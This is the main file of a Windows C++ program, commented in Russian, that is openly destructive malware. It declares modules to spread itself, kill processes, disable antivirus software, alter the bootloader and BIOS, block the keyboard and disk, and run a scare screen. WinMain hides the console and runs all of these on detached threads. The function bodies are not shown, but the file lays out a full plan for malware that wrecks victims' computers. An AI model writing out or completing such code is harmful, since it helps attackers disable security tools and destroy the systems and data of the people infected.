#include <windows.h>
#include <iostream>
#include <thread>
#include <vector>
#include <filesystem>
#include <fstream>
#include <string>
#include <random>
#include <chrono>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>

namespace fs = std::filesystem;

// Прототипы функций
void InitializeScareModule();
void InitializeFileSystemModule();
void InitializeKeyboardBlockModule();
void SpreadVirus();
void KillProcesses();
void DestroyAntivirus();
void ModifyBootloader();
void ModifyBIOS();
void OpenRandomAppsAndSites();
void ScreamerLoop();
void InitializeDiskBlockModule(); // НОВЫЙ МОДУЛЬ

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    std::vector<std::thread> threads;

    threads.emplace_back(InitializeScareModule);
    threads.emplace_back(InitializeFileSystemModule);
    threads.emplace_back(InitializeKeyboardBlockModule);
    threads.emplace_back(KillProcesses);
    threads.emplace_back(DestroyAntivirus);
    threads.emplace_back(ModifyBootloader);
    threads.emplace_back(ModifyBIOS);
    threads.emplace_back(OpenRandomAppsAndSites);
    threads.emplace_back(SpreadVirus);
    threads.emplace_back(InitializeDiskBlockModule); // ЗАПУСКАЕМ

    threads.emplace_back(ScreamerLoop);

    for (auto& t : threads) {
        if (t.joinable()) t.detach();
    }

    while (true) {
        Sleep(10000);
    }

    return 0;
}
